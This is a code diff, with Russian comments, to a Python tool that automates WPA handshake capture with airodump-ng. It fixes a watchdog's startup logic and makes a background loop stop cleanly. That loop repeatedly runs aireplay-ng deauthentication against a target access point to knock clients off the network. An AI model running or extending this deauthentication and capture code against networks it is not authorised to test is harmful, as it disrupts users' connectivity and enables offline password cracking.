@@ -494,17 +494,37 @@ def _any_file_fresh(paths, threshold=15):
 
 def _revive_watchdog(interface, watch_files, stop_event,
                      check_interval=5, stale_threshold=30, cooldown=20,
-                     revive_seconds=20):
+                     revive_seconds=20, startup_grace=45):
     """
     Следит за mtime файлов из watch_files (.cap, .csv). Если ни один
     не обновлялся stale_threshold секунд — гоняет airodump-ng без канала
     revive_seconds секунд, чтобы драйвер переинициализировался.
+
+    startup_grace — окно в начале, пока airodump-ng ещё поднимается и создаёт
+    .cap/.csv. В это время отсутствие свежих файлов — норма, а не зависание.
     """
-    last_revive = 0
+    start = time.time()
+    # Фикс: cooldown должен действовать и на первой итерации. С last_revive=0
+    # (time.time()-0 ≈ 1.7e9) он никогда не срабатывал, и оживление запускалось
+    # сразу же, ещё до создания файлов захвата.
+    last_revive = start
+    seen_file = False
+
     while not stop_event.is_set():
         time.sleep(check_interval)
         if stop_event.is_set():
             break
+
+        # Фаза старта: airodump-ng ещё не создал файлы — не считаем это зависанием.
+        if time.time() - start < startup_grace:
+            continue
+
+        # Пока ни один файл ни разу не появился, захват ещё поднимается, а не завис.
+        # Как только файл появился хоть раз — дальше судим по свежести mtime.
+        if any(os.path.exists(p) for p in watch_files):
+            seen_file = True
+        elif not seen_file:
+            continue
 
         if _any_file_fresh(watch_files, stale_threshold):
             continue
@@ -572,6 +592,9 @@ def capture_handshake(interface, target, work_dir, timeout=180, deauth=True):
         if cap_term is not None:
             print(f"[*] Захват открыт в отдельном окне ({term_name}).")
 
+    # Общий флаг остановки для фоновых потоков (watchdog + fallback-деаут).
+    stop_watchdog = threading.Event()
+
     # Окно с деаутентификацией
     deauth_term = None
     if deauth:
@@ -581,14 +604,18 @@ def capture_handshake(interface, target, work_dir, timeout=180, deauth=True):
             if deauth_term is not None:
                 print(f"[*] Деаутентификация открыта во втором окне ({term_name}).")
         else:
-            # Fallback: фоновый цикл без вывода
+            # Fallback: фоновый цикл без вывода. Завязан на stop_watchdog,
+            # иначе поток деаутил бы вечно и после завершения захвата.
             def _deauth_loop():
-                while True:
+                while not stop_watchdog.is_set():
                     subprocess.run(
                         ["aireplay-ng", "--deauth", "10", "-a", bssid, interface],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                     )
-                    time.sleep(20)
+                    for _ in range(20):
+                        if stop_watchdog.is_set():
+                            break
+                        time.sleep(1)
             threading.Thread(target=_deauth_loop, daemon=True).start()
             print("[*] Деаутентификация запущена в фоне (без вывода).")
 
@@ -601,7 +628,6 @@ def capture_handshake(interface, target, work_dir, timeout=180, deauth=True):
     csv_file = cap_file.replace("-01.cap", "-01.csv")
     watch_files = [cap_file, csv_file]
 
-    stop_watchdog = threading.Event()
     watchdog = threading.Thread(
         target=_revive_watchdog,
         args=(interface, watch_files, stop_watchdog),
